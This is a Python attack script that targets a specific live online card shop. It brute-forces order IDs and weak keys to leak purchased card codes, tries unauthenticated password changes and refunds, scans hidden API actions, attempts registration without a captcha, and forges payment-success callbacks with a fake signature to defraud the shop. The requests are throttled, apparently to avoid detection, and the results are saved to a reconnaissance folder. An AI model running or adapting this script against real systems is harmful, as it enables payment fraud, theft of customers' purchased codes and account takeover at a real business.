#!/usr/bin/env python3
"""Phase 2: test order IDOR, api.php, quickreg - 8s delay."""
import re, json, time, subprocess
from datetime import datetime

BASE = "https://xinhe001.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
DELAY = 8
findings = []

def curl(url, method="GET", data=None, timeout=25):
    time.sleep(DELAY)
    cmd = ["curl","-sS","-m",str(timeout),"-A",UA,"-w","\n__C__%{http_code}","-H","Accept: application/json, text/plain, */*"]
    if method=="POST":
        cmd += ["-X","POST","-H","Content-Type: application/x-www-form-urlencoded"]
        if data: cmd += ["-d", data]
    cmd.append(url)
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8","replace")
    except subprocess.CalledProcessError as e:
        out = e.output.decode("utf-8","replace")
    if "__C__" in out:
        body, code = out.rsplit("__C__",1)
        return body.strip(), int(code.strip())
    return out.strip(), 0

def hit(level, title, detail):
    findings.append({"level":level,"title":title,"detail":detail})
    print(f"[{level}] {title}: {detail[:250]}")

# --- ajax.php?act=order IDOR (id + skey) ---
print("=== order IDOR (ajax act=order) ===")
order_tests = []
for oid in [1, 2, 3, 10, 100]:
    for skey in ["", "1", "test", "000000", "123456", "abcdef", "a"*32]:
        b, c = curl(f"{BASE}/ajax.php?act=order", method="POST", data=f"id={oid}&skey={skey}")
        if b and "reset" not in b.lower() and "Empty" not in b:
            order_tests.append({"id":oid,"skey":skey,"http":c,"body":b[:300]})
            if '"code":0' in b or "kminfo" in b:
                hit("Critical", f"订单卡密泄露 id={oid} skey={skey}", b[:400])
            elif '"code":-1' not in b and "不存在" not in b and "错误" not in b:
                print(f"  id={oid} skey={skey[:8]}: {b[:120]}")
        if '"code":0' in b:
            break  # found, skip more skeys for this id

# response pattern summary
codes = {}
for t in order_tests:
    key = t["body"][:80]
    codes.setdefault(key, []).append(f"id={t['id']}")
if codes:
    print("order response patterns:", json.dumps(codes, ensure_ascii=False)[:400])

# --- changepwd / apply_refund without auth ---
print("\n=== changepwd / apply_refund ===")
for act, data in [
    ("changepwd", "id=1&pwd=hacked&skey=test"),
    ("apply_refund", "id=1&skey=test"),
    ("cancel", "orderid=1&hashsalt=x&csrf_token=x"),
]:
    b, c = curl(f"{BASE}/ajax.php?act={act}", method="POST", data=data)
    print(f"  {act}: {b[:150]}")
    if '"code":0' in b:
        hit("High", f"未授权 {act} 成功", b[:300])

# --- api.php act scan (500 = exists) ---
print("\n=== api.php acts ===")
api_map = {}
for act in ["goods","goodslist","shop","order","orders","query","kmlist","km","card",
            "stock","user","login","recharge","balance","pay","notify","check","info",
            "site","fenlei","class","article","buy","cart","email","sms","token","key",
            "getshop","getorder","orderlist","submit","setting","admin","test","debug","status","count","tools"]:
    b, c = curl(f"{BASE}/api.php?act={act}")
    if "reset" in b.lower() or not b:
        continue
    api_map[act] = {"http": c, "body": b[:150]}
    if c == 500:
        hit("Med", f"api.php act={act} 存在(500)", b[:100])
    elif "No Act" not in b:
        print(f"  {act} http={c}: {b[:100]}")
        if c == 200 and ("km" in b.lower() or "card" in b.lower() or "password" in b.lower()):
            hit("High", f"api.php act={act} 泄露数据", b[:300])

# --- quickreg / connect ---
print("\n=== quickreg / connect ===")
for act, data in [
    ("quickreg", "type=qq&submit=do"),
    ("connect", "type=qq"),
    ("connect", "type=wx"),
]:
    b, c = curl(f"{BASE}/user/ajax.php?act={act}", method="POST", data=data)
    print(f"  user/{act}: {b[:200]}")
    if '"code":0' in b:
        hit("High", f"quickreg/connect 无验证码注册 {act}", b[:300])

# --- epay_notify forgery variants ---
print("\n=== notify forgery ===")
notify_payloads = [
    ("other/epay_notify.php", "pid=1&trade_no=1&type=alipay&name=test&money=9.00&trade_status=TRADE_SUCCESS&sign=fake&sign_type=MD5"),
    ("other/epay_notify.php", "out_trade_no=1&trade_status=TRADE_SUCCESS"),
    ("other/notify.php", "trade_no=1&money=9&status=1"),
]
for path, data in notify_payloads:
    b, c = curl(f"{BASE}/{path}", method="POST", data=data)
    print(f"  {path}: {b[:100]}")
    if b.strip().lower() in ("success","ok","SUCCESS") or "success" in b.lower():
        hit("Critical", f"支付回调伪造 {path}", f"payload={data[:80]} resp={b}")

# --- getshuoshuo / getrizhi (QQ data leak) ---
print("\n=== QQ leak endpoints ===")
for act in ["getshuoshuo", "getrizhi", "getshareid"]:
    b, c = curl(f"{BASE}/ajax.php?act={act}&uin=10001&page=1&hashsalt=x")
    print(f"  {act}: {b[:120]}")
    if '"code":0' in b or "msglist" in b:
        hit("Med", f"QQ数据接口可访问 {act}", b[:200])

# --- mod=cutshop/groupshop/seckill hidden modules ---
print("\n=== hidden mods ===")
for mod in ["cutshop","groupshop","seckill","coupon","cart","fenlei","order"]:
    b, c = curl(f"{BASE}/?mod={mod}")
    if c == 200 and len(b) > 1000 and "404" not in b[:300]:
        print(f"  mod={mod}: len={len(b)}")
        if "admin" in b.lower() or "token" in b.lower():
            hit("Med", f"隐藏模块 mod={mod}", b[:200])

with open("/workspace/aaap-recon/xinhe_phase2_results.json","w") as f:
    json.dump({"ts":datetime.utcnow().isoformat(),"findings":findings,
               "order_tests":order_tests[:20],"api_map":api_map}, f, ensure_ascii=False, indent=2)
print(f"\nDONE {len(findings)} findings")
